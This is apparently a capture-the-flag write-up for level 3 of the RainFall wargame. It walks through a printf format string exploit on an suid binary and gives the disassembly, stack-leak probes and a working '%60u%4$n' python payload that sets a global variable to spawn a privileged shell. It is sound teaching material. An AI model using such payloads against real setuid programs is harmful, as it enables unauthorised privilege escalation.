level 3

We have an suid binary ./level3

two function main and v:

0x080484a4  v
0x0804851a  main

The main function only calls the v function
the v function contains this time fgets protected to stack overflow but we can use printf format string vulnerability.

Dump of assembler code for function v:
   0x080484a4 <+0>:	push   ebp
   0x080484a5 <+1>:	mov    ebp,esp
   0x080484a7 <+3>:	sub    esp,0x218
   0x080484ad <+9>:	mov    eax,ds:0x8049860
   0x080484b2 <+14>:	mov    DWORD PTR [esp+0x8],eax
   0x080484b6 <+18>:	mov    DWORD PTR [esp+0x4],0x200
   0x080484be <+26>:	lea    eax,[ebp-0x208]
   0x080484c4 <+32>:	mov    DWORD PTR [esp],eax
   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:	lea    eax,[ebp-0x208]
   0x080484d2 <+46>:	mov    DWORD PTR [esp],eax
   0x080484d5 <+49>:	call   0x8048390 <printf@plt>  #print the input
   0x080484da <+54>:	mov    eax,ds:0x804988c        #copy the value of a global variabl m to eax (ds = data segmant)
   0x080484df <+59>:	cmp    eax,0x40                #compare the value of eax(of m) with 64 if equal print wait what and call system "/bin/bash"
   0x080484e2 <+62>:	jne    0x8048518 <v+116>       #else return and exit
   0x080484e4 <+64>:	mov    eax,ds:0x8049880
   0x080484e9 <+69>:	mov    edx,eax
   0x080484eb <+71>:	mov    eax,0x8048600
   0x080484f0 <+76>:	mov    DWORD PTR [esp+0xc],edx
   0x080484f4 <+80>:	mov    DWORD PTR [esp+0x8],0xc
   0x080484fc <+88>:	mov    DWORD PTR [esp+0x4],0x1
   0x08048504 <+96>:	mov    DWORD PTR [esp],eax
   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:	mov    DWORD PTR [esp],0x804860d
   0x08048513 <+111>:	call   0x80483c0 <system@plt>
   0x08048518 <+116>:	leave
   0x08048519 <+117>:	ret
End of assembler dump.

So we need to overwrite the m variable with 64 to get shell with suid priv
first thing we need to find the position of our input 

level3@RainFall:~$ ./level3
aa%x %x %x %x %x %x %x
aa200 b7fd1ac0 b7ff37d0 78256161 20782520 25207825 78252078

so is the fourth one because we have 6161 aa in hex
now we need to get put the address of the variable m

(gdb) i var m
All variables matching regular expression "m":

Non-debugging symbols:
0x08049884  completed.6159
0x0804988c  m
(gdb)

lets write the payload 

python -c "print('\x8c\x98\x04\x08'+'%x %x %x %x')" | ./level3

level3@RainFall:~$ python -c "print('\x8c\x98\x04\x08'+'%x %x %x %x')" | ./level3
ï¿½200 b7fd1ac0 b7ff37d0 804988c

Now we need to use the n specifier %n (The number of characters written so far is stored into the integer indicated by the int * (or variant) pointer argument. No argument is converted.)
so the payload will be somthing like this 

python -c "print('\x8c\x98\x04\x08'+'%4\$n')" | ./level3 we specify where to write on stack we put the fourth stack address

till no we will write on the adress of m the length of '\x8c\x98\x04\x08' so m = 4
we need to add the pad

python -c "print('\x8c\x98\x04\x08' + '%60u%4\$n')" | ./level3

and to hang the shell we will add cat 
(python -c "print('\x8c\x98\x04\x08'+ '%60u%4\$n')"; cat) | ./level3

now we can print the pass from level 4

sources :https://axcheron.github.io/exploit-101-format-strings/
https://vickieli.dev/binary%20exploitation/format-string-vulnerabilities/
